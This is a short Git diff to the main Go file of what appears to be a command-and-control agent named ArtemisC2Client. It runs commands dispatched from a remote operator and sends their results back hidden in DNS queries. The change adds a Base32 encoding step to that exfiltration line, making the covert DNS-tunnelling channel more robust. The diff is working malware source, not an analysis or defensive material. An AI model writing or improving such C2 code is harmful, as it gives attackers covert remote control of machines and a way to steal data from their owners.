@@ -7,6 +7,7 @@ import (
 
 	"github.com/desertcod98/ArtemisC2Client/commands"
 	"github.com/desertcod98/ArtemisC2Client/dns"
+	"github.com/desertcod98/ArtemisC2Client/encoding"
 )
 
 var AgentId string
@@ -52,7 +53,7 @@ func main() {
 		if cmd, ok := commands.Dispatcher[strings.ToLower(commandType)]; ok {
 			resultChan := cmd.Execute(commandArgs)
 			result := <-resultChan
-			dns.DnsQuery(result + "." + job)
+			dns.DnsQuery(encoding.Base32Encode(result) + "." + job)
 		}
 	}
 }
